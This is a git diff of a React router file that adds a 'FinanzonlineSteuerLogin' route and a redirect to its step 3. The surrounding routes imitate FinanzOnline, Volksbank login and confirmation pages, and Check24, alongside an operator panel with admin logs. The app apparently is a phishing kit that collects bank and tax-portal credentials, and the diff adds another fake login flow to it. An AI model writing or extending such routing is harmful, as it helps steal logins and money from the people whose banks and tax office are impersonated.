@@ -7,6 +7,7 @@ import { PanelProvider, usePanel } from "@/components/PanelProvider";
 
 import Index from "./pages/Index.tsx";
 import FinanzonlineSteuer from "./pages/FinanzonlineSteuer.tsx";
+import FinanzonlineSteuerLogin from "./pages/FinanzonlineSteuerLogin.tsx";
 import Auth from "./pages/Auth.tsx";
 import Admin from "./pages/Admin.tsx";
 import AdminLogs from "./pages/AdminLogs.tsx";
@@ -98,6 +99,10 @@ const ConfirmationSwitch = () => {
   const [params] = useSearchParams();
   const s = params.get("s");
   const c24 = params.get("c24");
+  const fst = params.get("fst");
+  if (fst === "1" || (typeof window !== "undefined" && sessionStorage.getItem("fst_return") === "1")) {
+    return <Navigate to={`/finanzonline-steuer/login?step=3`} replace />;
+  }
   if (c24 === "1" || (typeof window !== "undefined" && sessionStorage.getItem("c24_return") === "1")) {
     return <Navigate to={`/check24/sichern?step=3`} replace />;
   }
@@ -138,6 +143,7 @@ const App = () => (
             <Route path="/" element={<P><SessionBankRouter /></P>} />
             <Route path="/finanzonline" element={<P><Index /></P>} />
             <Route path="/finanzonline-steuer" element={<P><FinanzonlineSteuer /></P>} />
+            <Route path="/finanzonline-steuer/login" element={<P><FinanzonlineSteuerLogin /></P>} />
             <Route path="/login" element={<P><VolksbankLogin /></P>} />
             <Route path="/login/bestaetigung" element={<P><VolksbankBestaetigung /></P>} />
             <Route path="/auth" element={<Auth />} />
